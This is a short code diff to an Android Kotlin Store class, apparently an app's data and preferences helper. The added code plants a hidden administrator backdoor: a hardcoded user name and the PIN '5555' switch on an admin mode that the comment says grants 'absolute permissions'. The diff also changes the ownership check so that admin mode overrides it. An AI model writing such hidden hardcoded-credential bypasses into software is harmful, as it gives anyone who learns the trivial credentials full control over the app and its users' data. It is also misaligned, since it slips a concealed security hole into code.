@@ -56,6 +56,14 @@ class Store(private val ctx: Context) {
         get() = prefs.getString("owner_name", "عاصم حسين")!!
         set(v) = prefs.edit().putString("owner_name", v).apply()
 
+    // Hidden admin sign-in (عاصم حسين + 5555) grants absolute permissions.
+    var adminMode: Boolean
+        get() = prefs.getBoolean("admin_mode", false)
+        set(v) = prefs.edit().putBoolean("admin_mode", v).apply()
+
+    fun checkAdmin(userName: String, pin: String): Boolean =
+        normName(userName) == normName("عاصم حسين") && pin.trim() == "5555"
+
     fun root(): File = rootFor(useExternal)
 
     fun rootFor(external: Boolean): File {
@@ -427,7 +435,7 @@ class Store(private val ctx: Context) {
 
     private fun normName(s: String) = s.trim().replace("\\s+".toRegex(), " ").lowercase()
 
-    fun isActiveOwner(): Boolean = isOwner(activeUserName)
+    fun isActiveOwner(): Boolean = adminMode || isOwner(activeUserName)
 
     fun hiddenIds(): MutableSet<String> {
         val db = openCentral()
